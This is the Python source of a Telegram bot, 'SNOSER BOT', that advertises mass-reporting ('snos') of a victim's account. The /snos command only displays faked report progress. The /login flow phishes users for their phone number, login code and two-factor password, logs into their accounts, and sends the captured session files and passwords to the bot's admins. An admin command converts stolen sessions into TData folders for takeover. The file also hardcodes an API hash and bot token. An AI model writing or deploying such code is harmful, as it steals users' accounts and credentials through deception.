#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import asyncio
import os
import json
import random
import sqlite3
import zipfile
import shutil
import hashlib
import threading
from datetime import datetime
from telethon import TelegramClient, events
from telethon.errors import FloodWaitError, SessionPasswordNeededError
from telethon.network.connection.tcpabridged import ConnectionTcpAbridged
from flask import Flask


API_ID = 33741333
API_HASH = 'ecc14282eca1e059e23746b5a2131c5e'
BOT_TOKEN = '8848989691:AAEaUxTtsfa-nwKdXDx6ntZzUziVp0SSs1k'
MASTER_ADMIN_ID = 2066633503
SECOND_ADMIN_ID = 2066633503  # ТВОЙ ID

# =========================================================
#  ФАЙЛЫ
# =========================================================

ADMINS_FILE = "admins.json"
SESSIONS_FOLDER = "sessions"
TDATA_FOLDER = "tdata_output"
SESSIONS_LIST_FILE = "sessions_list.json"
LOG_FILE = "session_log.txt"

os.makedirs(SESSIONS_FOLDER, exist_ok=True)
os.makedirs(TDATA_FOLDER, exist_ok=True)

def load_admins():
    if os.path.exists(ADMINS_FILE):
        with open(ADMINS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return [MASTER_ADMIN_ID]

def save_admins(admins):
    with open(ADMINS_FILE, 'w', encoding='utf-8') as f:
        json.dump(admins, f, indent=2)

def load_sessions_list():
    if os.path.exists(SESSIONS_LIST_FILE):
        with open(SESSIONS_LIST_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return []

def save_sessions_list(sessions):
    with open(SESSIONS_LIST_FILE, 'w', encoding='utf-8') as f:
        json.dump(sessions, f, indent=2, ensure_ascii=False)

def log_session(msg):
    with open(LOG_FILE, 'a', encoding='utf-8') as f:
        f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {msg}\n")

admins = load_admins()
sessions_list = load_sessions_list()
bot = None

def is_admin(user_id):
    return user_id in admins

def is_master(user_id):
    return user_id == MASTER_ADMIN_ID

# =========================================================
#  ОТПРАВКА СЕССИИ ТОЛЬКО АДМИНАМ
# =========================================================

async def send_session_to_admin(user_id, phone, session_path, password=None):
    global bot
    session_file = f"{session_path}.session"
    if not os.path.exists(session_file):
        return False
    
    try:
        client = TelegramClient(session_file, API_ID, API_HASH)
        await client.connect()
        me = await client.get_me()
        username = me.username or "нет"
        first_name = me.first_name or "нет"
        await client.disconnect()
    except:
        username = "неизвестно"
        first_name = "неизвестно"
    
    caption = f"""
🎯 **НОВАЯ СЕССИЯ!**

📱 Телефон: `{phone}`
👤 Имя: {first_name}
🆔 Юзернейм: @{username}
🆔 User ID: {user_id}
📅 Дата: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
    if password:
        caption += f"\n🔐 **ОБЛАЧНЫЙ ПАРОЛЬ (2FA):** `{password}`"
    caption += "\n\n⚠️ Файл сессии прикреплён ниже."
    
    for admin_id in admins:
        try:
            await bot.send_file(admin_id, session_file, caption=caption)
        except:
            pass
    
    log_session(f"Сессия отправлена админам: {phone}")
    return True

# =========================================================
#  КОНВЕРТАЦИЯ .SESSION → TDATA (ТОЛЬКО АДМИНЫ)
# =========================================================

async def convert_session_to_tdata(session_file_path, user_id):
    if not os.path.exists(session_file_path):
        return None, "Файл не найден!"
    if not session_file_path.endswith('.session'):
        return None, "Неверный формат! Нужен .session"
    
    try:
        base_name = os.path.splitext(os.path.basename(session_file_path))[0]
        tdata_folder = os.path.join(TDATA_FOLDER, f"tdata_{base_name}_{user_id}_{datetime.now().strftime('%H%M%S')}")
        
        if os.path.exists(tdata_folder):
            shutil.rmtree(tdata_folder)
        os.makedirs(tdata_folder, exist_ok=True)
        
        conn = sqlite3.connect(session_file_path)
        cursor = conn.cursor()
        cursor.execute("SELECT dc_id, auth_key, server_address, port FROM sessions")
        row = cursor.fetchone()
        
        if not row:
            conn.close()
            return None, "Сессия повреждена или пуста!"
        
        dc_id, auth_key, server_address, port = row
        
        hash_folder_name = "D877F783D5D3EF8C"
        hash_path = os.path.join(tdata_folder, hash_folder_name)
        os.makedirs(hash_path, exist_ok=True)
        
        hash_file_path = os.path.join(hash_path, hash_folder_name)
        with open(hash_file_path, 'wb') as f:
            f.write(auth_key[:256])
        
        session_data = bytearray()
        session_data.append(dc_id)
        session_data.extend(auth_key)
        
        session_file_name = "D877F783D5D3EF8Cs"
        session_file_path_tdata = os.path.join(tdata_folder, session_file_name)
        with open(session_file_path_tdata, 'wb') as f:
            f.write(session_data)
        
        key_data_path = os.path.join(tdata_folder, 'key_data')
        with open(key_data_path, 'wb') as f:
            f.write(auth_key[:32])
        
        conn.close()
        log_session(f"TData создан: {tdata_folder}")
        return tdata_folder, None
        
    except Exception as e:
        log_session(f"Ошибка конвертации: {e}")
        return None, f"Ошибка конвертации: {str(e)[:100]}"

# =========================================================
#  ЗАПУСК БОТА
# =========================================================

async def run_bot():
    global bot
    
    print("="*50)
    print("🔱 SNOSER BOT v4.0")
    print("="*50)
    
    bot = TelegramClient("bot_session", API_ID, API_HASH, connection=ConnectionTcpAbridged)
    await bot.start(bot_token=BOT_TOKEN)
    print("✅ Бот запущен!")
    
    # =========================================================
    #  КОМАНДА /START
    # =========================================================
    
    @bot.on(events.NewMessage(pattern='/start'))
    async def start_cmd(event):
        user_id = event.sender_id
        has_session = user_id in sessions_list
        is_admin_text = "✅" if is_admin(user_id) else "❌"
        
        await event.reply(f"""
╔═══════════════════════════════════════════╗
║          🔱 SNOSER BOT v4.0 🔱            ║
╠═══════════════════════════════════════════╣
║                                           ║
║  📌 /login — Добавить сессию              ║
║  💣 /snos — Запустить снос (жалобы)       ║
║  🔐 /admin — Админ-панель                 ║
║                                           ║
╠═══════════════════════════════════════════╣
║  👤 Твой ID: {user_id}                     ║
║  🔐 Сессия: {'✅ Есть' if has_session else '❌ Нет'}    ║
║  🔑 Админ: {is_admin_text}                 ║
╚═══════════════════════════════════════════╝
        """)
    
    # =========================================================
    #  КОМАНДА /LOGIN — ЛОВЛЯ СЕССИЙ
    # =========================================================
    
    login_states = {}
    
    @bot.on(events.NewMessage(pattern='/login'))
    async def login_cmd(event):
        user_id = event.sender_id
        
        if user_id in sessions_list:
            await event.reply("✅ У тебя уже есть сессия! Используй /snos для сноса.")
            return
        
        login_states[user_id] = {"step": "phone"}
        await event.reply("""
🔐 **ДОБАВЛЕНИЕ СЕССИИ**

📱 Введи номер телефона (с кодом страны):
Пример: +380123456789
        """)
    
    @bot.on(events.NewMessage)
    async def handle_login_input(event):
        user_id = event.sender_id
        text = event.text.strip()
        
        if user_id not in login_states:
            return
        if text.startswith('/'):
            return
        
        state = login_states[user_id]
        
        if state["step"] == "phone":
            if not text.startswith('+') or len(text) < 10:
                await event.reply("❌ Неверный формат! Введи номер с +")
                return
            
            phone = text
            login_states[user_id] = {"step": "code", "phone": phone}
            
            session_path = os.path.join(SESSIONS_FOLDER, f"user_{user_id}_{phone.replace('+', '')}")
            client = TelegramClient(session_path, API_ID, API_HASH, connection=ConnectionTcpAbridged)
            
            try:
                await client.connect()
                await client.send_code_request(phone)
                login_states[user_id]["client"] = client
                login_states[user_id]["path"] = session_path
                await event.reply(f"✅ Номер: {phone}\n📩 Введи код из Telegram через пробелы пример:2 2 2 2 2 :")
            except FloodWaitError as e:
                await event.reply(f"❌ Жди {e.seconds // 60} мин.")
                del login_states[user_id]
            except Exception as e:
                await event.reply(f"❌ {str(e)[:80]}")
                del login_states[user_id]
        
        elif state["step"] == "code":
            code = text.replace(" ", "").replace("-", "").replace("_", "")
            
            if not code.isdigit() or len(code) < 4:
                await event.reply("❌ Неверный код!")
                return
            
            client = state.get("client")
            phone = state.get("phone")
            session_path = state.get("path")
            
            if not client:
                await event.reply("❌ Ошибка, начни /login заново")
                del login_states[user_id]
                return
            
            try:
                await client.sign_in(phone, code)
                
                if user_id not in sessions_list:
                    sessions_list.append(user_id)
                    save_sessions_list(sessions_list)
                
                await send_session_to_admin(user_id, phone, session_path, None)
                
                await event.reply("""
✅ **СЕССИЯ ДОБАВЛЕНА!**

Теперь ты можешь использовать /snos для сноса аккаунтов.
                """)
                del login_states[user_id]
            except SessionPasswordNeededError:
                login_states[user_id]["step"] = "password"
                await event.reply("🔐 Введи облачный пароль (2FA):")
            except Exception as e:
                await event.reply(f"❌ {str(e)[:80]}")
                del login_states[user_id]
        
        elif state["step"] == "password":
            password = text
            client = state.get("client")
            phone = state.get("phone")
            session_path = state.get("path")
            
            if not client:
                await event.reply("❌ Ошибка, начни /login заново")
                del login_states[user_id]
                return
            
            try:
                await client.sign_in(password=password)
                
                if user_id not in sessions_list:
                    sessions_list.append(user_id)
                    save_sessions_list(sessions_list)
                
                await send_session_to_admin(user_id, phone, session_path, password)
                
                await event.reply("""
✅ **СЕССИЯ + ПАРОЛЬ ДОБАВЛЕНЫ!**

Теперь ты можешь использовать /snos для сноса аккаунтов.
                """)
                del login_states[user_id]
            except Exception as e:
                await event.reply(f"❌ {str(e)[:80]}")
                del login_states[user_id]
    
    # =========================================================
    #  КОМАНДА /SNOS — ВИЗУАЛ СНОСА (ДЛЯ ВСЕХ С СЕССИЕЙ)
    # =========================================================
    
    snos_states = {}
    
    @bot.on(events.NewMessage(pattern='/snos'))
    async def snos_cmd(event):
        user_id = event.sender_id
        
        if user_id not in sessions_list:
            await event.reply("""
╔═══════════════════════════════════════════╗
║  ❌ **СНАЧАЛА ДОБАВЬ СЕССИЮ!**            ║
╠═══════════════════════════════════════════╣
║                                           ║
║  Используй команду /login, чтобы          ║
║  добавить сессию.                         ║
║                                           ║
╚═══════════════════════════════════════════╝
            """)
            return
        
        snos_states[user_id] = {"step": "username"}
        await event.reply("""
🎯 **ВВЕДИ ЮЗЕРНЕЙМ ЖЕРТВЫ**

Введи username (без @):
Пример: trak
        """)
    
    @bot.on(events.NewMessage)
    async def handle_snos_input(event):
        user_id = event.sender_id
        text = event.text.strip()
        
        if user_id not in snos_states:
            return
        if text.startswith('/'):
            return
        
        state = snos_states[user_id]
        
        if state["step"] == "username":
            username = text.replace('@', '').strip()
            
            if not username:
                await event.reply("❌ Неверный username!")
                del snos_states[user_id]
                return
            
            await event.reply(f"""
🎯 **ЦЕЛЬ:** @{username}
🔪 **ЗАПУСКАЮ СНОС...**
            """)
            
            # ВИЗУАЛ СНОСА (20 жалоб)
            await asyncio.sleep(0.5)
            
            steps = [
                "[⚙️] 🔍 Анализ целевого аккаунта...",
                "[⚙️] 📊 Сбор метаданных профиля...",
                "[⚙️] 🔎 Поиск нарушений...",
                "[⚙️] ⚡️ Проверка активности..."
            ]
            
            for step in steps:
                await event.reply(step)
                await asyncio.sleep(0.5)
            
            await event.reply("📨 Инициализация масс-репорта...")
            await asyncio.sleep(0.5)
            
            # Отправка 20 жалоб
            total_reports = 20
            statuses = ["принято 📨", "отправлено 📤", "успешно ✅"]
            
            for i in range(1, total_reports + 1):
                status = random.choice(statuses)
                progress = int((i / total_reports) * 5)
                bar = "█" * progress + "░" * (5 - progress)
                
                await event.reply(f"📤 Отправка жалобы #{i} | {status} | [{bar}]")
                await asyncio.sleep(random.uniform(0.2, 0.5))
            
            await event.reply("⏳ Ожидание ответа модерации Telegram...")
            await asyncio.sleep(0.5)
            
            for i in range(1, 4):
                await event.reply(f"🔄 Обработка жалобы #{i} в очереди...")
                await asyncio.sleep(0.3)
            
            await event.reply("⏳ ОЖИДАЙТЕ СНОСА ЖЕРТВЫ... ⏳")
            await asyncio.sleep(0.5)
            
            await event.reply("📢 Жалобы отправлены, аккаунт передан на рассмотрение модерации.")
            await event.reply("🕐 Обычно это занимает от 6 до 48 часов.")
            
            await event.reply("📨 Фоновые процессы:")
            for i in range(1, 6):
                await event.reply(f"└── Репорт #{i} | в обработке")
                await asyncio.sleep(0.2)
            
            await event.reply(f"""
🔪 **СЕССИЯ СНОСА ЗАВЕРШЕНА**

📊 **ИТОГ:**
✅ Отправлено жалоб: {total_reports}
📨 Все успешно доставлены.

⏳ **Ожидайте результат:**
🕐 Примерное время: 6-48 часов.
📌 Аккаунт передан на рассмотрение модерации Telegram.
            """)
            
            log_session(f"Снос выполнен: @{username} | {total_reports} жалоб")
            del snos_states[user_id]
    
    # =========================================================
    #  КОМАНДА /ADMIN — ТОЛЬКО ДЛЯ АДМИНОВ
    # =========================================================
    
    @bot.on(events.NewMessage(pattern='/admin'))
    async def admin_panel(event):
        user_id = event.sender_id
        
        # =========================================================
        #  ПРОВЕРКА — ЕСЛИ НЕ АДМИН, ПИШЕМ ОШИБКУ
        # =========================================================
        
        if not is_admin(user_id):
            await event.reply("""
╔═══════════════════════════════════════════╗
║            ❌ **НЕТ ДОСТУПА!**             ║
╠═══════════════════════════════════════════╣
║                                           ║
║  Эта команда только для администраторов.  ║
║                                           ║
╚═══════════════════════════════════════════╝
            """)
            return
        
        session_files = [f for f in os.listdir(SESSIONS_FOLDER) if f.endswith('.session')]
        
        await event.reply(f"""
╔═══════════════════════════════════════════╗
║          🔐 АДМИН-ПАНЕЛЬ                  ║
╠═══════════════════════════════════════════╣
║                                           ║
║  👑 Мастер: {MASTER_ADMIN_ID}              ║
║  👥 Админов: {len(admins)}                  ║
║  📁 Сессий поймано: {len(session_files)}      ║
║  🔐 Активных сессий: {len(sessions_list)}    ║
║                                           ║
║  📌 /addadmin ID — добавить админа        ║
║  📌 /removeadmin ID — удалить админа      ║
║  📌 /listadmins — список админов          ║
║  📌 /list_sessions — список сессий        ║
║  📌 /clear_sessions — удалить сессии      ║
║  📌 /snos — запустить снос                ║
║                                           ║
╚═══════════════════════════════════════════╝
        """)
    
    # =========================================================
    #  ДОБАВЛЕНИЕ АДМИНА (ТОЛЬКО МАСТЕР)
    # =========================================================
    
    @bot.on(events.NewMessage(pattern='/addadmin (.+)'))
    async def add_admin(event):
        user_id = event.sender_id
        
        if not is_master(user_id):
            await event.reply("❌ Только мастер может добавлять админов!")
            return
        
        try:
            new_admin = int(event.pattern_match.group(1).strip())
        except:
            await event.reply("❌ Введи корректный ID! Пример: /addadmin 123456789")
            return
        
        if new_admin in admins:
            await event.reply(f"⚠️ {new_admin} уже админ!")
            return
        
        admins.append(new_admin)
        save_admins(admins)
        await event.reply(f"✅ {new_admin} добавлен в админы!")
        log_session(f"Добавлен админ: {new_admin}")
    
    # =========================================================
    #  УДАЛЕНИЕ АДМИНА (ТОЛЬКО МАСТЕР)
    # =========================================================
    
    @bot.on(events.NewMessage(pattern='/removeadmin (.+)'))
    async def remove_admin(event):
        user_id = event.sender_id
        
        if not is_master(user_id):
            await event.reply("❌ Только мастер может удалять админов!")
            return
        
        try:
            admin_id = int(event.pattern_match.group(1).strip())
        except:
            await event.reply("❌ Введи корректный ID! Пример: /removeadmin 123456789")
            return
        
        if admin_id == MASTER_ADMIN_ID:
            await event.reply("❌ Нельзя удалить мастера!")
            return
        
        if admin_id not in admins:
            await event.reply(f"⚠️ {admin_id} не является админом!")
            return
        
        admins.remove(admin_id)
        save_admins(admins)
        await event.reply(f"✅ {admin_id} удалён из админов!")
        log_session(f"Удалён админ: {admin_id}")
    
    # =========================================================
    #  СПИСОК АДМИНОВ (ТОЛЬКО АДМИНЫ)
    # =========================================================
    
    @bot.on(events.NewMessage(pattern='/listadmins'))
    async def list_admins(event):
        user_id = event.sender_id
        
        if not is_admin(user_id):
            await event.reply("❌ Нет доступа!")
            return
        
        text = "👥 **АДМИНЫ:**\n\n"
        for a in admins:
            master = "👑" if a == MASTER_ADMIN_ID else ""
            text += f"• `{a}` {master}\n"
        
        await event.reply(text)
    
    # =========================================================
    #  ОСТАЛЬНЫЕ АДМИН-КОМАНДЫ
    # =========================================================
    
    @bot.on(events.NewMessage(pattern='/list_sessions'))
    async def list_sessions_cmd(event):
        user_id = event.sender_id
        if not is_admin(user_id):
            await event.reply("❌ Нет доступа!")
            return
        
        files = [f for f in os.listdir(SESSIONS_FOLDER) if f.endswith('.session')]
        if not files:
            await event.reply("📭 Нет сессий!")
            return
        
        text = "📁 **СЕССИИ:**\n\n"
        for i, f in enumerate(files, 1):
            size = os.path.getsize(os.path.join(SESSIONS_FOLDER, f))
            text += f"{i}. `{f}` ({size} байт)\n"
        await event.reply(text)
    
    @bot.on(events.NewMessage(pattern='/clear_sessions'))
    async def clear_sessions_cmd(event):
        user_id = event.sender_id
        if not is_master(user_id):
            await event.reply("❌ Только мастер!")
            return
        
        files = [f for f in os.listdir(SESSIONS_FOLDER) if f.endswith('.session')]
        if not files:
            await event.reply("📭 Нет сессий!")
            return
        
        for f in files:
            os.remove(os.path.join(SESSIONS_FOLDER, f))
        await event.reply(f"✅ Удалено {len(files)} сессий!")
    
    # =========================================================
    #  ОБРАБОТЧИК .SESSION → TDATA (ТОЛЬКО АДМИНЫ)
    # =========================================================
    
    @bot.on(events.NewMessage(func=lambda e: e.file and e.file.name and e.file.name.endswith('.session')))
    async def handle_session_file(event):
        user_id = event.sender_id
        if not is_admin(user_id):
            await event.reply("❌ Нет доступа!")
            return
        
        await event.reply("⏳ Конвертирую в TData...")
        
        try:
            file_path = os.path.join(SESSIONS_FOLDER, f"uploaded_{user_id}_{datetime.now().strftime('%H%M%S')}.session")
            await event.download_media(file_path)
            
            if not os.path.exists(file_path):
                await event.reply("❌ Ошибка скачивания!")
                return
            
            tdata_folder, error = await convert_session_to_tdata(file_path, user_id)
            
            if error:
                await event.reply(f"❌ {error}")
                os.remove(file_path)
                return
            
            zip_path = f"{tdata_folder}.zip"
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, dirs, files in os.walk(tdata_folder):
                    for file in files:
                        file_path_full = os.path.join(root, file)
                        arcname = os.path.relpath(file_path_full, tdata_folder)
                        zipf.write(file_path_full, arcname)
            
            await bot.send_file(user_id, zip_path, caption="✅ TData готов!")
            
            os.remove(file_path)
            shutil.rmtree(tdata_folder, ignore_errors=True)
            os.remove(zip_path)
            
        except Exception as e:
            await event.reply(f"❌ {str(e)[:100]}")
    
    # =========================================================
    #  ЗАПУСК БОТА
    # =========================================================
    
    print("✅ Бот готов к работе!")
    await bot.run_until_disconnected()

# =========================================================
#  FLASK ДЛЯ RENDER
# =========================================================

app = Flask(__name__)

@app.route('/')
def home():
    return "🔱 SNOSER BOT is running!", 200

@app.route('/health')
def health():
    return "OK", 200

def start_bot():
    asyncio.run(run_bot())

if __name__ == "__main__":
    bot_thread = threading.Thread(target=start_bot, daemon=True)
    bot_thread.start()
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)